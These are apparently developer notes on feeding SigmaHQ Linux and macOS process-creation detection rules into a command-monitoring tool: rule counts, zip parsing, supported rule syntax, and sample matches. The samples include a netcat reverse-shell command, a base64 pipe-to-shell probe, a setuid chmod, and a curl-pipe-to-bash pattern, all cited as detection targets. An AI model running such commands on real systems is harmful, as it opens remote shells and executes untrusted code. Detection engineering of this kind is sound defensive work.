# Command-shapes feed (Sigma) — facts

- Source is the release asset `https://github.com/SigmaHQ/sigma/releases/latest/download/sigma_all_rules.zip` (3.2 MB, monthly, DRL 1.1). `sigma_core.zip` has only 39 of the Linux/macOS process-creation rules; the full bundle has 137 (90 linux + 47 macos); master has 189 — we ship the release.
- `src/feeds/zip.ts` reads zips with no dependency (central directory + `zlib.inflateRawSync`); Bun has no zip API and `unzip` is not on Windows.
- 121/137 rules compile. The 16 skipped need `ParentImage`/`ParentCommandLine`/`User`/`LogonId`/`CurrentDirectory` in a positive position. Vocabulary that matters: `CommandLine|contains[|all]`, `Image|endswith`, `|startswith`, `|re`, conditions `selection`, `all of X*`, `1 of X*`, `and/or/not`, parentheses. `Image` = first token of each simple command, bare names prefixed with `/` so `endswith '/nc'` works.
- A negated filter that needs missing context evaluates to false ("no filter") → more hits. Monitor first; `blitzpi report` prints the per-rule hit ledger.
- Sample matches: `nc -e /bin/sh h 4444` → Netcat Reverse Shell; `echo aGk= | base64 -d | sh` → Base64 Encoded Pipe to Shell (harmless probe command); `chmod +s /tmp/x` → "Chmod Targeting Sensitive Directories" (an FP class to watch). `curl … | bash` has no Linux Sigma rule — the built-in `dangerousShape` covers it.
- Test fixture `tests/fixtures/sigma-sample.zip` is generated with python `zipfile` from real rule files; the base64 rule's file is `proc_creation_lnx_base64_execution.yml` (not "…pipe_to_shell").
